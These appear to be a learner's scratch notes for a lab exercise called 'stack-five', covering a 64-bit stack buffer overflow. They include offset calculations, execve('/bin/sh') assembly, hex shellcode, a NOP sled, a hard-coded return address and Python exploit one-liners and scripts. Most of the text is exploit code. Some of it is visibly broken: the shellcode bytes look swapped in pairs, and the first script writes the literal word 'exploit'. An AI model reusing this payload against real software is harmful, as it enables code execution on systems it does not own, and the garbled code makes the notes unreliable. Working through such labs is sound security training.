# Working on the problem
For this level the buffer is 128 bytes.
To do the traditional buffer overflow, you need get $rip = address of shellcode.
With this in mind 137 "A" characters gets control of the rip register.
This means 136 characters is the padding for the actual rip register.
# Creating the shellcode
The shellcode for this level simply runs /bin/sh.
To do this some very basic shellcode can be used.
```
.global _start
_start:
.intel_syntax noprefix
    mov rax, 59
    lea rdi, [rip+binsh]
    mov rsi, 0
    mov rdx, 0
    syscall
binsh:
    .string "/bin/sh"
```
# Scratch
0x7fffffffe620
acvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaega
acvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeea\xe6\xff\xff\xff\x7f\x00\x00
## Find the buffer before doing anything else
This will help when actually injecting the shellcode
Just point the ip to the buffer instead other weird addresses
This is the address of the buffer: 0x7fffffffe590
Now we everything we need to write the exploit

## current shellcode
\xc7\x48\x3b\xc0\x48\x3d\x8d\x10\xc7\x48\xc6\x48\xc2\xc7\x05\x0f\x62\x2f\x6e\x69\x73\x2f\x68

\x3b\xb0\x3d\x8d\x00\x07\x00\x00\xb6\x40\xb2\x00\x0f\x00\x2f\x05\x69\x62\x2f\x6e\x68\x73\x00\x00 





## Current oneliner
```
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*136 + b"\x8d\x05@\x00")' | ./stack-five
python3 -c 'import sys; sys.stdout.buffer.write(b"\x90"*30 + b"\xc7\x48\x3b\xc0\x48\x3d\x8d\x10\xc7\x48\xc6\x48\xc2\xc7\x05\x0f\x62\x2f\x6e\x69\x73\x2f\x68" + b"A"*35 + b"AAAAAAAA" + b"\x90\xe5\xff\xff\xff\x7f\x00\x00")'
```

## Exploit Script
```
import sys

exploit = ""
exploit += "\x90" * 30
exploit += "\xc7\x48\x3b\xc0\x48\x3d\x8d\x10\xc7\x48\xc6\x48\xc2\xc7\x05\x0f\x62\x2f\x6e\x69\x73\x2f\x68"
exploit += "A" * (128-len(exploit))
exploit += "AAAAAAAA"
exploit += "\x90\xe5\xff\xff\xff\x7f\x00\x00"

sys.stdout.buffer.write(b"exploit")

-----
import sys

exploit = ""
exploit += "\x90" * 30
exploit += "\x3b\xb0\x3d\x8d\x00\x07\x00\x00\xb6\x40\xb2\x00\x0f\x00\x2f\x05\x69\x62\x2f\x6e\x68\x73\x00\x00"
exploit += "A" * (128-len(exploit))
exploit += "AAAAAAAA"
exploit += "\x90\xe5\xff\xff\xff\x7f\x00\x00"

sys.stdout.buffer.write(exploit.encode())

```
